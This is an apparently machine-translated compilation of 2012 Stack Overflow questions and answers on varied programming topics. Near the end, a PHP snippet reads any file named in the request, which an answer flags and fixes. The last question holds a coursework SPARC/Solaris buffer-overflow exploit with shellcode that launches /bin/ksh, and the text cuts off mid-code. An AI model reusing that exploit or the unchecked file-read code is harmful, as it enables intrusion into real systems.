> 时间：2012-05-01T20:39:25.327

到目前为止，当我更新到具有相当多不同文件的最新[Github PHP Active Record](https://github.com/kla/php-activerecord)时，它似乎正在工作。我很困惑，因为他们网站上的 ZIP 与 GitHub 相比已经过时了。

新副本似乎有一个[auto-rbuilt](https://github.com/kla/php-activerecord/commit/aed05c2ac86457bafb41c386072701e8e9228b9e)，我不必手动执行此操作（还）

# asp.net - web.config - 每次构建后“此文件已在源编辑器之外修改”？

> ID：10403731
> 
> 赞同：0
> 
> 时间：2012-05-01T20:15:10.947
> 
> 标签：asp.net, asp.net-mvc-3, asp.net-profiles

我继承了一个 asp.net-mvc3 项目，并且项目文件夹中的 webconfig 在每次构建时都被修改（设置为默认/固定的一组配置项）。我认为这是由于有条件的 xslt 配置转换，但事实并非如此。我在转换后的 web.debug.config 中拥有什么并不重要，因为它不会覆盖 webconfig 中生成的内容。

每次我修改 webconfig 时，每次构建后都会出现“此文件已在源编辑器之外修改”的对话框。

这可以在自定义构建设置中吗？我在这里完全不知所措。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:25:56.247

您的属性中是否有任何 Post 或 Pre build 事件：

![在此处输入图像描述](../Images/00f849c81566b6f5d66a9663cfff2d37.png)

# code-analysis - 我们如何在 Visual Studio 11 Beta 中更正或抑制来自代码分析的 CA0503 和 CA0505 消息

> ID：10403733
> 
> 赞同：1
> 
> 时间：2012-05-01T20:15:19.453
> 
> 标签：code-analysis, visual-studio-2012, static-code-analysis

当我在一个相当简单的项目上运行代码分析时，我立即得到“CA0503 问题运行代码分析”和“CA0505 问题运行代码分析”违规。 [CA0503 文档页面](http://msdn.microsoft.com/query/dev11.query?appId=Dev11IDEF1&l=EN-US&k=k%28CA0503%29;k%28TargetFrameworkMoniker-.NETFramework,Version=v4.0%29;k%28DevLang-csharp%29&rd=true)说，“该属性已弃用。使用替代属性。” 但是，它没有指向替代属性、如何处理错误或如何抑制错误。显然，这是一个隐藏的 Microsoft 规则集，您不能只是关闭该规则。

[CA0505 文档页面](http://msdn.microsoft.com/en-us/library/ee461609.aspx)类似地指出，“已弃用的属性将被忽略，因为已定义取代的属性。” 它继续说，“当指定的已弃用和替代代码分析属性都包含项目或构建配置文件中的值时，会生成警告 CA505。要解决此问题，请删除已弃用的属性。”

在整个解决方案中搜索 CA0503 或 CA0505 的文本不会返回任何内容。但是，搜索“CodeAnalysisRules”会在我的两个项目文件中找到一行：

> <CodeAnalysisRules>-Microsoft.Design#CA2210</CodeAnalysisRules>

通过类似的文本搜索未找到“CodeAnalysisRuleSet”的对应行。

有没有其他人遇到过这种情况，也许找到了纠正或抑制这些消息的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-26T13:04:02.707

`.ruleset`我在将 Visual Studio 2008 项目升级到 Visual Studio 2013 时遇到了这个问题。在升级过程中，由于我称之为“特殊 TFS 源代码控制原因”而出现了一个关于无法添加文件的错误。

升级前，我的项目文件（在我的例子中是一个`.csproj`文件）包含一个`<CodeAnalysisRules>`元素。这包含一个与项目代码分析规则相关的巨大字符串。升级后，我的项目文件的`CodeAnalysisRules`元素没有改变，但是`Migrated rules for [project name].ruleset`在项目目录中创建了一个文件。

为了解决它，我：

1.  将文件添加`.ruleset`到项目中（它可能已经为您添加，我的只是转储到项目目录中）。
2.  卸载项目。
3.  `.csproj`通过完全删除`<CodeAnalysisRules>`元素并在其位置`<CodeAnalysisRuleSet>Migrated rules for [project name].ruleset</CodeAnalysisRuleSet>`或文件名中添加任何内容来更新`.ruleset`文件。
4.  重新加载项目。

我假设在成功升级期间，Visual Studio 会解析旧元素的内容，基于它`<CodeAnalysisRules>`创建一个文件，并将其链接到项目。`.ruleset`我猜它并不总是有效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T09:18:35.120

如果您从以前的 Visual Studio 更新了解决方案，并且您已经定义了一个集中式规则文件。您需要[手动将](http://xtrmdevtips.blogspot.be/2011/01/annoying-static-code-analysis-errors-in.html)其从项目中删除。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:05:48.100

在运行代码分析时，您的项目文件会自动更新。将添加一个条目 - CodeAnalysisRules。这就是发出此警告的原因。我认为，您需要以这样的方式进行配置，即元素 CodeAnalysisRules 不会出现在项目文件中。

# java - 无法从套接字读取字节数组

> ID：10403735
> 
> 赞同：-1
> 
> 时间：2012-05-01T20:15:37.023
> 
> 标签：java, sockets, datainputstream, dataoutputstream

我正在编写一个应用程序，我在其中通过 java 中的套接字传输字节数组。

客户端字节数组的生成如下：

```
String vote = br.readLine();
// the data that i now encrypt using RSA

          PublicKey pubKey = readKeyFromFilepublic("alicepublic.txt");
          Cipher cvote = Cipher.getInstance("RSA");
          cvote.init(Cipher.ENCRYPT_MODE, pubKey);
          byte[] voted = cvote.doFinal(vote.getBytes());
          System.out.println(voted);
          out.println(voted.length);
          dos.write(voted,0,voted.length); // here i am sending the array to the server 
```

在服务器端我写

```
 String clen = in.readLine(); // read the length 
 byte[] array = new byte[Integer.parseInt(clen)]; // create the array of that length 
 dist.readFully(array); // read the array 

 // i am unable to read the array here at all !

 PrivateKey priKey = readKeyFromFileprivate("aliceprivate.txt");
 Cipher vote = Cipher.getInstance("RSA");
 vote.init(Cipher.DECRYPT_MODE, priKey);
 byte[] voteData = vote.doFinal(array);
 System.out.println(voteData);

// finally print the decrypted array 
```

我已经通过写入文件来检查加密和解密过程，它可以正常工作。

我在两端使用 DataInput 和 DataOutput 流。

你能告诉我我的代码有什么问题吗！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:27:08.290

不要在同一个流上混合读取字符数据和二进制数据（至少，不要使用不同的流）。你没有显示“in”的类型，但我猜它是一个 BufferedReader （这里的关键点是“缓冲”）。BufferedReader 将读取*比*下一行更多的内容，因此您的 byte[] 的一部分位于您的 BufferedReader 中。对流上的所有操作使用相同的 DataOutputStream/DataInputStream。如果您需要写入文本数据，请使用 writeUTF/readUTF。当您写入 byte[] 的长度时，只需使用 writeInt/readInt。

# ruby-on-rails - 使用 Bundler 在 Rails 项目中使用 gem 中的 Rack 中间件的正确方法

> ID：10403739
> 
> 赞同：2
> 
> 时间：2012-05-01T20:16:03.650
> 
> 标签：ruby-on-rails, bundler, rack, middleware

我有一个使用 Bundler 设置的 Rails 项目。我捆绑的其中一个 gem 提供了一个 Rack 中间件，我想在我的 Rails 应用程序中使用它（但只能在“生产”Rails 环境中使用）。

如果我只是把这样的东西放进去`config/environments/production.rb`，我会得到一个未知的常量错误：

```
config.middleware.use ::Rack::MyMiddleware 
```

...大概是因为`Bundler.require`此时尚未调用，并且我的捆绑宝石都不可用。

我找到了一些解决这个问题的方法，但没有一个看起来很好，我想知道我是否缺少更标准的解决方案：

1.  明确`require 'my_middleware_gem'`地在`config/environments/production.rb`
2.  将调用包装`config.middleware.use`在一个`after_initialize`块中，确保在我尝试引用常量之前 Bundler 有机会做它的事情。
3.  使用字符串 ( `"::Rack::MyMiddleware"`) 而不是裸类常量。由于某种原因，这似乎不适用于 Unicorn，但确实适用于其他一些服务器（对于 Unicorn，它最终会尝试调​​用`"::Rack::MyMiddleware".new`，这当然会失败）。

我错过了一些更好的方法吗？在初始化过程中的什么时候，捆绑的 gem 应该可用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-09T07:03:47.237

复制评论中的答案，以便从“未回答”过滤器中删除此问题：

[马特](https://stackoverflow.com/users/214790/matt)建议：

> 我认为`after_initialize`在这种情况下使用块是正确的方法。

[抱怨者](https://stackoverflow.com/users/187529/grumbler)证实：

> 是的，这就是我最终的结果。谢谢！关于原始问题中提到的独角兽问题，原来我遇到了这个问题：[http ://davidvollbracht.com/blog/headachenewunicorn-capistrano-bundler-usr2](http://davidvollbracht.com/blog/headachenewunicorn-capistrano-bundler-usr2)

# ios - 代码更改后在模拟器上调试 XCode

> ID：10403745
> 
> 赞同：0
> 
> 时间：2012-05-01T20:16:25.183
> 
> 标签：ios, xcode, debugging

有没有办法在更改应用程序代码后更新模拟器而不在模拟器上重新启动应用程序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:19:51.723

不，您只需在模拟器中停止应用程序并再次运行它。

# c# - 一个很好的动画库，用于可视化排序算法

> ID：10403748
> 
> 赞同：1
> 
> 时间：2012-05-01T20:16:29.650
> 
> 标签：c#, java, javascript, jquery, ajax

我有一个学校作业，排序算法的可视化（合并排序，冒泡排序）。我查看了 Processing、JsAnim、cake 和其他几个库，但不确定它们是否对我的应用程序有用（可视化排序算法）。

我熟悉 C# 和小 javascript。任何适合我需要的图书馆？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:23:38.807

您尚未明确要使用哪种语言。由于您的标签，我将假定它是 java 。如果您被允许使用外部资源，您可以使用普林斯顿大学的 Robert Sedgewick 博士和 Kevin Wayne 博士编写的对象。它被称为 StdDraw，来自他们的书 Algorithms, 4th Edition。源代码的网址在这里：

[http://algs4.cs.princeton.edu/stdlib/StdDraw.java.html](http://algs4.cs.princeton.edu/stdlib/StdDraw.java.html)

如果你不能使用外部资源，我会推荐 Java Swing Package。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:57:43.170

我在编写并行排序时有这样的任务。我使用了 C# ZedGraph 库：

[ZedGraph 教程](http://quantcsharp.webs.com/howtousezedgraph.htm)

主要思想是将排序元素的值表示为具有适当高度的垂直线（如直方图）。

这是它在排序之前的样子：

![在此处输入图像描述](../Images/04212d996964f69fa96445feda41ce5a.png)

之后：

![在此处输入图像描述](../Images/0b276b19acffe27f612f14b203470260.png)

所以我们看到所有元素都已排序。

为了可视化过程的每一步，我更改了 zedgraph 控件的值并刷新了它。在我的代码中，它看起来像：

```
private static void CreateGraph3(ZedGraphControl zgc)
    {
        // get a reference to the GraphPane
        GraphPane pane = zgc.GraphPane;

        // Set the Titles
        pane.Title.Text = "Sorting";
        //Clear current values
        pane.CurveList.Clear();

        // histogram high
        double[] values = new double[n];

        //fill values
        for (int i = 0; i < n; i++)
        {
            values[i] = A1[i]; //A1 is an array that is currently sort
        }

        //create histogram
        BarItem curve = pane.AddBar("Elements", null, values, Color.Blue);

        pane.BarSettings.MinClusterGap = 0.0F; //set columns references

        // update axis
        zgc.AxisChange();

        // update graph
        zgc.Invalidate();
    } 
```

每次对某些值进行排序时，我都会调用此函数，因此我们看到了整个排序过程的视频。要将当前库包含到您的项目中，您需要：

1）右键单击您的工具箱

2）选择（或添加）项目

3) 浏览，选择 ZedGraph.DLL 并按 OK

4) ZedGraphControl 将被添加到您的工具箱中，您可以像使用其他控件一样使用它。

就这样吧，祝你好运

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:21:19.023

如果您不介意排除旧的或蹩脚的浏览器，您可以使用 CSS3 动画。只需设置一堆`li`s 代表列表中的项目，给它们`position:absolute`并操纵每个`li`的`top`属性以将它们随机排列。

网络似乎还没有成为一个好的、权威的参考指南，但是[这里](http://css3.bradshawenterprises.com/)有一些 CSS3 动画的例子。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-01T20:22:17.797

处理应该非常适合可视化排序算法。

一个例子：[http ://www.openprocessing.org/sketch/29208](http://www.openprocessing.org/sketch/29208)

# c++ - 使用线程创建丢失对象时传入参数的值

> ID：10403749
> 
> 赞同：-1
> 
> 时间：2012-05-01T20:16:39.127
> 
> 标签：c++, multithreading, function

我的问题是关于创建对象时传入的值。进行调试，很明显'id'，'cont'，'size'和'nthreads'的值不知何故丢失了。我在互联网上搜索并找到链接[https://stackoverflow.com/questions/1151582](https://stackoverflow.com/questions/1151582/pthread-function-from-a-class)教如何传递对象并让方法调用他。它一直有效，直到方法'run（）'，在创建对象时传递的值丢失。我不知道我是否需要弄乱静态类型以便它不会，但是，我不知道该怎么做。

```
class Section1SimpleBarrierThread {

 Section1SimpleBarrierThread(int id, Section1Counter* cont, int size, int nthreads) {
        this->id = id;
        this->cont = cont;
        this->size = size; 
        this->nthreads = nthreads;
  }

  void* run(void){
    pthread_mutex_lock(&mutex);
    for(int i=0; i<size; i++) {
       cont->shared_cont++;
       if(cont->shared_cont != this->nthreads) {
         //cont.wait();
       } else {
          //cont->shared_cont = 0;
          // cont.notifyAll();
       }  
   }
   pthread_mutex_unlock(&mutex);
  }

  static void* run_helper(void* context){
     return ((Section1SimpleBarrierThread*)context)->run();
  }  
};

while ( (time < TARGETTIME) && (size < MAXSIZE) ){     
j->resetTimer("Section1:Barrier:Simple"); j->startTimer("Section1:Barrier:Simple");

for(int i=0; i<nthreads; i++) { 
thobjectsSimpleBarrierThread[i]= new Section1SimpleBarrierThread(i,cont,size,nthreads);
pthread_create(&thread_id[i],NULL,&Section1SimpleBarrierThread::run_helper,&thobjectsSimpleBarrierThread[i]);

for(int i=0; i<nthreads; i++) {
        pthread_join(thread_id[i],NULL);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:28:06.000

'&thobjectsSimpleBarrierThread[i]' - 这个数组在哪里，它的类型是什么。这里的 '&' 运算符看起来很可疑... thobjectsSimpleBarrierThread 肯定已经是指针类型，因为您在上面的行中对其进行了 new() 操作！

# c# - Windows Phone 7 应用程序中的已完成和异步方法

> ID：10403751
> 
> 赞同：1
> 
> 时间：2012-05-01T20:16:44.877
> 
> 标签：c#, windows-phone-7

我在 windows phone 7 应用程序中使用已完成和异步方法时遇到问题。

我的代码在这里：

```
private void messageClient_getMessageOfUserCompleted(object sender, ADRTRYST_CLIENT.LocalHostMessageService.getMessageOfUserCompletedEventArgs e)
    {
        //lstBxMessages.ItemsSource = e.Result;

        System.Collections.ObjectModel.ObservableCollection<ADRTRYST_CLIENT.LocalHostMessageService.OBJMessage> mesList = e.Result;
        foreach (ADRTRYST_CLIENT.LocalHostMessageService.OBJMessage mes in mesList)
        {
            MessageObj message = new MessageObj();
            message.Date = mes.MessageDate;
            messageList.Add(message);
            ADRTRYST_CLIENT.LocalHostMemberShipService.MemberShipSoapClient memClient = new ADRTRYST_CLIENT.LocalHostMemberShipService.MemberShipSoapClient();
            MessageBox.Show(memClient.State.ToString());
            memClient.GetUserByUserIdCompleted += new EventHandler<ADRTRYST_CLIENT.LocalHostMemberShipService.GetUserByUserIdCompletedEventArgs>(memClient_GetUserByUserIdCompleted);  
            memClient.GetUserByUserIdAsync(mes.SenderUserID);

            lstBxMessages.Items.Add(mes.MessageDate);

        }
    }

    private void memClient_GetUserByUserIdCompleted(object sender, ADRTRYST_CLIENT.LocalHostMemberShipService.GetUserByUserIdCompletedEventArgs e)
    {

        ADRTRYST_CLIENT.LocalHostMemberShipService.OBJPerson user = e.Result;
        if (user != null)
            lstBxMessages.Items.Add(user.UserName);

    } 
```

我期望在列表框中看到消息的日期，然后是消息的发件人。但是，首先列出所有日期，然后在列表框中列出发件人姓名。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T21:19:35.823

因为事件是异步触发的，所以 ListBox 首先被循环`MessageDates`中的所有内容填充。`foreach`如果`MessageDate`不是已完成事件参数的一部分，那么您可以对已完成事件使用匿名方法来用`MessageDate`and填充列表框`User`：

```
memClient.GetUserByUserIdCompleted += (obj, e) => 
{
    if (e.Result == null)
        return;

    lstBxMessages.Items.Add(mes.MessageDate);
    lstBxMessages.Items.Add(e.Result.UserName);
}
memClient.GetUserByUserIdAsync(mes.SenderUserID); 
```

# c# - 使用 ConcurrentBag 是否正确 作为 ConcurrentDictionary 的对象

> ID：10403754
> 
> 赞同：8
> 
> 时间：2012-05-01T20:16:58.380
> 
> 标签：c#, multithreading

在以下代码中：

```
public class SomeItem { }
public class SomeItemsBag : ConcurrentBag< SomeItem > { }
public class SomeItemsList : List< SomeItem > { }
public static class Program
{
    private static ConcurrentDictionary< string, SomeItemsBag > _SomeItemsBag;
    private static ConcurrentDictionary< string, SomeItemsList > _SomeItemsList;

    private static void GetItem(string key)
    {
        var bag = _SomeItemsBag[key];
        var list= _SomeItemsList[key];
        ...
    }
} 
```

我的假设是 bag 是线程安全的，而 list 不是。这是在多线程应用程序中处理列表字典的正确方法吗？

编辑添加：只有 1 个线程将添加到包/列表中，另一个线程将删除，但许多线程可以访问。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T21:13:30.227

`ConcurrentBag`您关于线程安全且不正确的假设`List`是正确的。但是，您可以同步对列表的访问，例如：

```
private static ConcurrentDictionary< string, SomeItemsBag > _SomeItemsBag;
private static ConcurrentDictionary< string, SomeItemsList > _SomeItemsList;
private static object _someItemsListLocker = new object();

private static void GetItem(string key)
{
    var bag = _SomeItemsBag[key];
    lock (_someItemsListLocker) {
        var list = _SomeItemsList[key];
    }
} 
```

However, you're better off describing the situation completely if you want more holistic advice as to what data structure you should be using. Note that there are also `ConcurrentQueue` and `ConcurrentStack` which may be better for what you want over the list. They are optimised in multi-threaded scenarios since addition and removal can only happen on one side respectively (same sides for stack, opposite sides for queue).

# android - android：如何在tablelayout上方实现空间（屏幕和tablelayout之间）

> ID：10403755
> 
> 赞同：0
> 
> 时间：2012-05-01T20:17:00.670
> 
> 标签：android, tablelayout

我无法上传图片以更好地帮助我。

如何在屏幕和表格布局之间的表格布局顶部（即）获得空间。下面的表格开始时表格和屏幕之间没有任何空格。

```
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:background="@drawable/my_shape_file"
android:layout_alignParentRight="true" 
android:layout_marginTop="10dip"
android:stretchColumns="3">

 <TableRow>

        <TextView
            android:layout_column="1"
            android:gravity="left"            
            android:background="@drawable/todayhr"/>

        <TextView
            android:layout_column="2"
            android:text="one"
            android:gravity="center"
            android:textColor="#000000" />
    </TableRow>

  <View
    android:layout_height="1dip"
    android:layout_width="wrap_content"
    android:background="#ABABAB" />

  <tablerow>
  .................
    ........ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:22:44.670

视图的边距被其容器用来定位视图本身。只需将 包含`TableLayout`在 LinearLayout 中，后者将正确添加边距。

# java - 将消息对象从 JavaMail 保存到文件系统

> ID：10403760
> 
> 赞同：3
> 
> 时间：2012-05-01T20:17:37.090
> 
> 标签：java, file, object, serialization, jakarta-mail

消息类不可序列化，因此您不能将其对象存储在文件中。我试图提取它的重要部分以调用构造函数，但它依赖于其他不可序列化的类。还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-08-28T13:35:23.130

一种选择是使用[mbox 本地存储提供程序](http://www.oracle.com/technetwork/java/faq-135477.html#localprovs)。否则，您可以使用[javax.mail.internet.MimeMessage.writeTo(OutputStream)](https://javamail.java.net/nonav/docs/api/javax/mail/internet/MimeMessage.html#writeTo-java.io.OutputStream-)将消息存储到文件系统并使用[javax.mail.internet.MimeMessage(Session, InputStream)](https://javamail.java.net/nonav/docs/api/javax/mail/internet/MimeMessage.html#MimeMessage-javax.mail.Session-java.io.InputStream-)从文件系统创建消息。

# php - 这个 PHP 脚本正确吗？

> ID：10403762
> 
> 赞同：0
> 
> 时间：2012-05-01T20:17:43.317
> 
> 标签：php, actionscript-3

我有一个 as3 脚本，它使用查询字符串加载 PHP 脚本的 urlrequest，但我不确定它是否正常工作。

**AS3：**

```
userLoad=new URLLoader;
userReq=new URLRequest("http://users/redirect.php?goto=u"+meFB+"/char.xml");
userLoad.addEventListener(Event.COMPLETE,userLoaded);` 
```

**PHP：**

```
$goto=$_REQUEST['goto'];
return readfile($goto);` 
```

我最近在路径中添加了一个目录，它似乎不再工作了......

因为我只需要 94 分来回答我自己的问题，我将把答案留在这里：没试过，但我真的认为通过查询传递给 php 的字符串必须避免斜杠空格和其他字符，而是使用 char 编码。如果有人肯定知道，请留下答案。我只是避免了斜线并且像魅力一样工作。请求方法也是你们所说的安全漏洞吗？我对 php 不是很好，所以我不知道，但我可以更改它以获取是否更好。感谢您的回答和评论顺便说一句。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:30:21.140

还有其他方法可以做到这一点，但这很容易理解并且不是安全漏洞。（当我们说安全漏洞时，您当前的代码将使任何人都可以轻松地完全访问您的系统。）

这里的技巧是路径中的硬编码。

```
<?php
switch($_GET['goto']){
    case 'char':
    readfile('char.xml');
    break;

    case 'uchar1':
    readfile('directory/uchar.xml');
    break;

// repeat for all files
}
?> 
```

# mysql - solr delta import “获取”但不“处理”

> ID：10403763
> 
> 赞同：5
> 
> 时间：2012-05-01T20:17:44.990
> 
> 标签：mysql, solr, dataimporthandler

当我运行 /solr/dataimport?command=full-import 时，它会处理所有文档。但是，当我运行增量导入 (/solr/dataimport?command=delta-import) 时，它会正确识别更新的数据（返回“ `<str name="Total Rows Fetched">1</str>`”）但不处理任何数据（返回“ `<str name="Total Changed Documents">0</str>`”）

我的 data-config.xml 看起来像这样：

```
<entity name="category" pk="catID" 
query="SELECT CONCAT('c_',catID) ID, catID, catName FROM category" 
deltaImportQuery="SELECT CONCAT('c_',catID) ID, catID, catName FROM category WHERE catID = '{$dataimporter.delta.catID}'" 
deltaQuery="SELECT catID FROM category WHERE catDate &gt; '${dataimporter.last_index_time}'"/> 
```

（注意 - 我的 concat 有一个单独的原因）

为什么在增量导入获取但不处理时完整导入过程？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:39:18.510

`'{$dataimporter.delta.catID}'`，这里`catID`应该是字段定义中名称属性的值。我有同样的问题，然后意识到引用的变量是字段名......我希望它有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-04-30T16:34:11.790

我有同样的问题，发现 deltaImportQuery 区分大小写

将我的 id 列设为“ID”

deltaImportQuery="select id,state,name,place,city from temp where **ID='${dih.delta.ID}**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-05T05:33:09.077

在您的情况下，增量查询工作正常，但您的增量导入查询失败。

这是因为你已经给予，

deltaImportQuery="SELECT CONCAT('c_',catID) ID, catID, catName FROM category WHERE catID = **'{$dataimporter.delta.catID}'** "

但它应该被赋予，

deltaImportQuery="SELECT CONCAT('c_',catID) ID, catID, catName FROM category WHERE catID = **'${dataimporter.delta.catID}'** "

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-09T14:38:22.397

这是因为完全导入将处理数据库中的每个文档。

增量导入仅处理自您上次导入任何类型以来已修改的文档（在您的情况下，由 catDate 字段决定）。

例如，假设您在 2012-09-09 12:15:38 执行完全导入。

接下来，您在 2012-09-10 12:15:38 执行增量导入。只有 catDate > '2012-09-09 12:15:38' 的文档才会被处理。

这个想法是 delta-import 是一种维护不断变化的索引的方法，而不必每次都进行完全导入。

# java - 传递参数与从函数返回参数

> ID：10403766
> 
> 赞同：8
> 
> 时间：2012-05-01T20:18:02.360
> 
> 标签：java, parameter-passing, pass-by-reference

从标题中可以清楚地看出我们应该更喜欢哪种方法？

意图是传递一些方法参数并得到一些东西作为输出。我们可以传递另一个参数，方法会更新它，方法现在不需要返回任何东西，方法只会更新输出变量，它会反映给调用者。

我只是想通过这个例子来阐述这个问题。

```
List<String> result = new ArrayList<String>();

for (int i = 0; i < SOME_NUMBER_N; i++) {
    fun(SOME_COLLECTION.get(i), result);
}

// in some other class
public void fun(String s, List<String> result) {
    // populates result
} 
```

相对

```
List<String> result = new ArrayList<String>();

for (int i = 0; i < SOME_NUMBER_N; i++) {
    List<String> subResult = fun(SOME_COLLECTION.get(i));
    // merges subResult into result
    mergeLists(result, subResult);
}

// in some other class
public List<String> fun(String s) {
    List<String> res = new ArrayList<String>();
    // some processing to populate res
    return res;
} 
```

我知道一个通​​过参考，另一个没有。

我们应该更喜欢哪一个（在不同的情况下），为什么？

**更新**：仅考虑可变对象。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-01T20:58:23.810

从函数返回值通常是一种更简洁的代码编写方式。由于创建和销毁指针的性质，传递一个值并修改它更像是 C/C++ 风格。

开发人员通常不希望通过函数传递值来修改他们的值，除非函数明确声明它修改了值（而且我们经常浏览文档）。

不过也有例外。

考虑 的例子`Collections.sort`，它实际上做了一个就地排序的列表。想象一下包含 100 万个项目的列表，而您正在对其进行排序。也许您不想创建另一个包含 100 万个条目的列表（即使这些条目指向原始条目）。

支持拥有不可变对象也是一种好习惯。不可变对象在开发的大多数方面（例如线程）引起的问题要少得多。因此，通过返回一个新对象，您不会强制参数是可变的。

重要的部分是要清楚你在方法中的意图。我的建议是尽可能避免修改参数，因为它不是 Java 中最典型的行为。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-01T20:59:07.103

**你应该退货。**您提供的第二个示例是要走的路。

**首先，它更清楚。**当其他人阅读您的代码时，他们可能不会注意到参数正在被修改为输出。您可以尝试命名变量，但在代码可读性方面，它更可取。

**您应该返回它而不是传递它**的重要原因是使用****不可变对象。** 您的示例 List 是可变的，因此可以正常工作。但是，如果您尝试以这种方式使用 String，**它将无法正常工作。****

 **由于字符串是不可变的，如果你传入一个字符串作为参数，那么函数会说：

```
public void fun(String result){
    result = "new string";
} 
```

您传入的结果值**不会**被更改。相反，局部范围变量“result”现在指向 fun 内部的一个新字符串，但调用方法中的结果仍然指向原始字符串。

如果您致电：

```
String test = "test";
fun(test);
System.out.println(test); 
```

它将打印：“test”，而不是“new string”！

因此，绝对是返回是优越的。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:26:17.930

这更多的是关于最佳实践和您自己的编程方法。我会说，如果您知道这将是一个单值返回类型函数，例如：

函数 IsThisNumberAPrimeNumber{ }

然后你知道这只会返回一个布尔值。我通常将函数用作辅助程序而不是大型子程序。我还应用了命名约定，这些约定有助于规定我期望 sub\function 将返回的内容。例子：

GetUserDetailsRecords GetUsersEmailAddress IsEmailRegistered

如果您查看这 3 个名称，您会发现第一个名称将为您提供多个用户详细记录的列表或类别，第二个将为您提供电子邮件的字符串值，第三个可能会为您提供布尔值。如果你改变名字，你就会改变意思，所以我想说另外考虑一下。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-01T20:29:34.553

我认为我们不理解的原因是这是两种完全不同类型的行为。将变量传递给函数是为函数提供数据的一种方式。从函数中返回它是从函数中传递数据的一种方式。

如果您的意思是这两个动作之间的区别：

```
public void doStuff(int change) {
    change = change * 2;
} 
```

和

```
public void doStuff() {
    int change = changeStorage.acquireChange();
    change = change * 2;
} 
```

然后第二个通常更干净，但是有几个原因（安全性，功能可见性等）可以阻止您以这种方式传递数据。

这也是更可取的，因为它使重用代码更容易，并使其更加模块化。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-05-09T03:20:04.170

根据伙计们的建议和Java代码约定以及语法限制，这是一个坏主意，并且使代码更难理解，但是您可以通过实现引用持有者类来做到这一点

```
public class ReferenceHolder<T>{
        public T value;
} 
```

并将 ReferenceHolder 的对象传递给方法参数，由方法填充或修改。另一方面，该方法必须将其返回值分配给 Reference 值而不是返回它。这是通过 ReferenceHolder 而不是函数返回获取平均方法结果的代码。

```
public class ReferenceHolderTest {
    public static void main(String[] args) {
        ReferenceHolder<Double> out = new ReferenceHolder<>();
        average(new int[]{1,2,3,4,5,6,7,8},out);
        System.out.println(out.value);
    }

    public static void average(int[] x, ReferenceHolder<Double> out ) {
        int sum=0;
        for (int a : x) {
            sum+=a;
        }
        out.value=sum/(double)x.length;
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-01T20:24:08.790

返回它将使您的代码更干净，并减少方法/类之间的耦合。**

# buffer-overflow - 为什么其中一个程序有效而另一个无效？

> ID：10403768
> 
> 赞同：2
> 
> 时间：2012-05-01T20:18:11.967
> 
> 标签：buffer-overflow, sun, sparc

我最近完成了一个项目，我要编写一个程序来“攻击” SUN Sparc“服务器”并导致缓冲区溢出。基本上，目标是从正在运行的“服务器”内部启动 /bin/ksh。

最终我让它工作了，但我认为这是一个愚蠢的原因：当用户输入缓冲区和偏移值作为参数时它不起作用，但是当值被硬编码时它起作用。

这是“刚性”程序：

```
#include <stdlib.h>
#include <stdio.h>

/* lsd - Solaris shellcode 
 */
static char shell[]=         /* 10*4+8 bytes */

        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x7f\xff\xff\xff"   /* call  */
        "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */
        "\x92\x02\x20\x10"   /* add %o0,16,%o1 */
        "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */
        "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */
        "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */
        "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */
        "\x91\xd0\x20\x08"   /* ta 8 */
        "/bin/ksh" ;

#define BUFSIZE 864

/* SPARC NOP
 */
static char np[] = "\xac\x15\xa1\x6e";

unsigned long get_sp( void ) {
        asm("or %sp,%sp,%i0");
}

main( int argc, char *argv[] ) {

    char buf[ BUFSIZE ],*ptr;
    unsigned long ret,sp;
    int rem,i,err;

    ret = sp = get_sp();

    if( argv[1] ) {
            ret -= strtoul( argv[1], (void *)0, 16 );
    }

    /* align return address: IMPORTANT to be multiple of 8!! */

    if( ( rem = ret % 8 ) ) {
            ret &= ~(rem);
    }

    bzero( buf, BUFSIZE );
    for( i = 0; i < BUFSIZE; i+=4 ) {
            strcpy( &buf[i], np );
    }

    memcpy( (buf + BUFSIZE - strlen( shell ) - 8),shell,strlen( shell ));

    ptr = &buf[856];

    /* set fp to a save stack value
     */
    *( ptr++ ) = ( sp >> 24 ) & 0xff;
    *( ptr++ ) = ( sp >> 16 ) & 0xff;
    *( ptr++ ) = ( sp >> 8 ) & 0xff;
    *( ptr++ ) = ( sp ) & 0xff;

    /* we now overwrite saved PC
     */
